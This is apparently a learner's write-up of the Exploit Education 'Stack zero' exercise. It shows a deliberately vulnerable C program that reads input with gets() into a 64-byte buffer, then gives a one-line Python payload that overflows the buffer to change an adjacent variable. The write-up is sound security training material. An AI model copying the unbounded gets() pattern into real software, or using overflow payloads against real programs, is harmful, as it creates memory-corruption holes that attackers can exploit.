# Stack zero


## Code

```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  } 

  exit(0);
}

```
***
In this exercise we are meant to modify the values of the variable `changeme` by overflowing the `buffer[64]`. This can be done because of the use of the function `gets()`, an insecure lib_c function that doesn't perform any kind of bounds checking. 


So the solution to this level is to simply exceed the size of the buffer, in this case 64. 


## Exploit

Payload

`python -c "print('A' * 64 + 'B')" | ./stack-zero `
